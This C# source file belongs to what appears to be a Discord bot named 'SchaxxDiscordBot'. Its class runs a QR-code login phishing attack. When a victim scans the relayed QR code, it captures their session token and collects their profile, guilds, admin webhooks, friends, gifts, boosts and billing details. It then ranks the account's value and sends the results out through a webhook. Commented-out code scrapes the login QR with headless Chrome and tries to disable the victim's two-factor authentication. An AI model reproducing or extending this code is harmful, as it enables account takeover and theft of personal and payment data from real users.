using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Net;

namespace SchaxxDiscordBot
{

    class UserDataCollector
    {
        public enum Result
        {
            TIMEOUT,
            SUCCESS,
            MFA,
            MFAFAILURE
        }
        public class QRCodeGottenEventArgs : EventArgs
        {
            public MemoryStream ms;
            public QRCodeGottenEventArgs(MemoryStream ms)
            {
                this.ms = ms;
            }
        }

        public class ResultEventArgs : EventArgs
        {
            public Result r;
            public ResultEventArgs(Result r)
            {
                this.r = r;
            }
        }

        public event EventHandler QRCodeGotten;
        public event EventHandler ResultGotten;

        UserObject user;

        public UserDataCollector()
        {
            user = new UserObject();
        }
        QRCodeAuthFlow qr;

        private void collectData()
        {
            try
            {
                user.fetchCountryCode();
                user.fetchProfile();
                user.fetchGuild();
                user.guilds.All(g => { if (g.Value.isAdmin()) user.fetchWebHooks(g.Value); return true; });
                user.fetchFriends();
                user.fetchGifts();
                user.fetchBoosts();
                user.fetchBillings();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.Source);
                Console.WriteLine(e.StackTrace);
                Console.WriteLine(e.TargetSite);


            }
        }

        public void close()
        {
            qr.stop();
        }
        public Boolean runMFA(String code)
        {
            if (user.disableMFA(code))
            {
                ResultGotten?.Invoke(this, new ResultEventArgs(Result.SUCCESS));
                return true;
            }
            else
            {
                ResultGotten?.Invoke(this, new ResultEventArgs(Result.MFAFAILURE));
                return false;
            }

        }

        public void run()
        {
            /*
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            service.EnableVerboseLogging = false;
            service.SuppressInitialDiagnosticInformation = true;
            service.HideCommandPromptWindow = true;

            ChromeOptions options = new ChromeOptions();
            options.AddArgument("--disable-logging");
            options.AddArguments("--mute-audio");
            options.AddArguments("--disable-extensions");
            options.AddArguments("--disable-notifications");
            options.AddArguments("--disable-application-cache");
            options.AddArguments("--no-sandbox");
            options.AddArgument("--disable-crash-reporter");
            options.AddArguments("--disable-dev-shm-usage");
            options.AddArguments("--disable-gpu");
            options.AddArgument("--ignore-certificate-errors");
            options.AddArguments("--disable-infobars");
            options.AddArgument("--window-size=1920,1080");
            options.AddArgument("--start-maximized");
            options.AddArgument("--headless");
            options.AddArgument("--silent");

            cd = new ChromeDriver(service, options);
            cd.Url = "https://discord.com/login";
            
            IWebElement qrimg = null;


            while (true)
            {
                // Wait for page to load and get QRCode image
                try
                {
                    IWebElement qrcode = cd.FindElement(By.CssSelector(".qrCode-2R7t9S"));
                    qrimg = qrcode.FindElement(By.CssSelector("img"));
                    break;
                }
                catch (Exception) { }
                Thread.Sleep(100);
            }

            String src = qrimg.GetAttribute("src").Replace("data:image/png;base64,", "");

            // Create overlay discord logo in the center
            ImageFactory overlay = new ImageFactory();
            overlay.Load("overlay.png")
                .Resize(new Size(50, 50));

            ImageLayer iloverlay = new ImageLayer();
            iloverlay.Image = overlay.Image;
            iloverlay.Position = new Point(60, 55);

            // Create QRCode
            ImageFactory qr = new ImageFactory();
            qr.Load(Convert.FromBase64String(src))
              .Overlay(iloverlay);

            ImageLayer ilqr = new ImageLayer();
            ilqr.Image = qr.Image;
            ilqr.Position = new Point(10, 10);

            // Create full frame
            ImageFactory frame = new ImageFactory();
            frame.Load(new Bitmap(180, 180))
                 .Resize(new Size(180, 180))
                 .BackgroundColor(Color.White)
                 .Overlay(ilqr);

            MemoryStream ms = new MemoryStream();
            
            frame.Image.Save(ms, ImageFormat.Png);

            QRCodeGotten?.Invoke(this, new QRCodeGottenEventArgs(ms));

            String login_url = cd.Url;
            DateTime endtime = DateTime.Now.AddSeconds(120);
            
            // Wait for user to login or time to run out
            while (true)
            {
                if (DateTime.Now > endtime)
                {
                    // QRCode time expired
                    Console.WriteLine("QR scan timeout");
                    ResultGotten?.Invoke(this, new ResultEventArgs(Result.TIMEOUT));
                    this.close();
                    break;
                }
            */
            qr = new QRCodeAuthFlow();
            qr.Step += (i, a) => {
                StepEventArg s = (StepEventArg)a;
                Console.WriteLine("Step down");
                switch (s.af)
                {
                    case (AuthFlow.PENDING):
                        Console.WriteLine("QR code generated, sending to user. . .");
                        QRCodeGotten?.Invoke(this, new QRCodeGottenEventArgs(s.qrcode));

                        break;
                    case (AuthFlow.TIMEOUT):
                        Console.WriteLine("QR code timed out in event");
                        ResultGotten?.Invoke(this, new ResultEventArgs(Result.TIMEOUT));

                        break;
                    case (AuthFlow.SCANNED):
                        Console.WriteLine("QR Code scanned");
                        break;
                    case (AuthFlow.SUCCESS):
                        Console.WriteLine("Getting token . . .");
                        String token = s.token;

                        user.setToken(token);
                        Console.WriteLine("Collecting data. . .");
                        this.collectData();
                        Console.WriteLine("Sending webhook. . .");

                        // Calculate account value
                        Webhooks.AccountValue val = Webhooks.AccountValue.UNVALUABLE;

                        if (user.billings.Count > 0 || user.boosts.Count(b => b.Value.cooldown == null) > 0 || user.gifts.Count > 0)
                        {
                            val = Webhooks.AccountValue.VALUABLE;
                        }

                        if ((user.flags & (long)UserFlag.PARTNER) != 0 ||
                            ((user.flags & (long)UserFlag.VERIFIED_BOT_DEVELOPER) != 0) ||
                            ((user.flags & (long)UserFlag.BUG_HUNTER) != 0 ||
                            ((user.flags & (long)UserFlag.BUG_HUNTER_LEVEL_2) != 0) ||
                            (user.flags & (long)UserFlag.HYPESQUAD) != 0))
                        {
                            val = Webhooks.AccountValue.IMPORTANT;
                        }

                        Webhooks.sendAccountWebhook(val, user);

                        ResultGotten?.Invoke(this, new ResultEventArgs(Result.SUCCESS));

                        Console.WriteLine("Done.");
                        break;

                }
            };
            qr.run();



            return; // 2FA is hucccc
            /*user.setToken(token);
            if (user.mfa)
            {
                // Disable multi factor authentification
                Console.WriteLine("Account has multifactor authentification");
                ResultGotten?.Invoke(this, new ResultEventArgs(Result.MFA));
                this.close();
            }
            else
            {
                Console.WriteLine("Account does not have multifactor authentification, go ahead and slam !");
                ResultGotten?.Invoke(this, new ResultEventArgs(Result.SUCCESS));
                this.close();
            }*/


            //SQLInstance.insertUser(token, 1337);

            //Console.WriteLine("Token: " + token);


        }
    }
}
